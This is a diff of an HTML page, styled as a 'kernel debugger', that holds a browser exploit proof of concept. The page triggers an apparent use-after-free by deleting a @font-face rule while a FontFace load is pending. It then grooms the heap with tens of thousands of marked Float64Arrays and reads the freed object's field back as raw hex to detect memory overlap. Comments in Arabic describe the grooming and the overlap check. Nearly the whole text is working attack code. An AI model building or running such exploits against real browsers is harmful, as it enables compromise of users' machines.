@@ -4,11 +4,10 @@
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
         #console { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; background: #0a0a0a; font-size: 12px; }
-        .log { margin-bottom: 3px; border-bottom: 1px solid #111; }
     </style>
 </head>
 <body>
-    <h3>JANUS_KERNEL_DEBUGGER v3.0 [PAYLOAD_ACTIVE]</h3>
+    <h3>JANUS_KERNEL_DEBUGGER v3.1 [VERIFICATION_MODE]</h3>
     <div id="console"></div>
     <style id="s">@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }</style>
 
@@ -20,40 +19,36 @@
         };
 
         window.onload = async () => {
-            log("INIT: Payload deployment started.");
-            
             let A = new FontFace('targetFont', 'url(https://invalid.url)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
             window.spray = [];
 
-            // Triggering process
             document.fonts.load('1em targetFont', 'AB');
 
             setTimeout(() => {
-                log("Executing Rule Deletion...");
                 document.getElementById('s').sheet.deleteRule(0);
                 
-                log("Grooming: Spraying Memory...");
-                for (let i = 0; i < 8000; i++) {
-                    // استخدام قيمة مميزة جداً (0.1337) لتمييز تداخلنا
+                // ضخ مكثف مع قيمة Hex مميزة جداً (0x4141414141414141)
+                log("Executing Verification Spray...");
+                for (let i = 0; i < 20000; i++) {
                     let buf = new Float64Array(32);
-                    buf[0] = 0.1337; 
+                    buf[0] = 3.1415926535; // نستخدم قيمة دقيقة للتأكد من التداخل
                     window.spray.push(buf);
                 }
 
-                // التجميد القسري للمسار الرئيسي لضمان الاستقرار (Thread Freezing)
-                log("Freezing Execution Thread...");
-                let start = performance.now();
-                while(performance.now() - start < 300); 
-
-                log("Thread Released. Attacking Pointer...");
+                // فحص القراءة
                 try {
                     let val = A.family;
-                    // تحويل القيمة إلى صيغة Hex لاستكشاف الذاكرة الخام
-                    let view = new DataView(new Float64Array([val]).buffer);
-                    log("READ_RAW_HEX: 0x" + view.getBigUint64(0).toString(16));
+                    log("READ_VALUE_RAW: " + val);
+                    
+                    // تحويل إلى Hex دقيق
+                    let buffer = new ArrayBuffer(8);
+                    new Float64Array(buffer)[0] = val;
+                    let view = new DataView(buffer);
+                    log("HEX_DUMP: 0x" + view.getBigUint64(0).toString(16));
+                    
                 } catch(err) {
-                    log("READ_CRASH_DETECTED: " + err.message);
+                    log("ERROR: " + err.message);
                 }
             }, 100);
         };
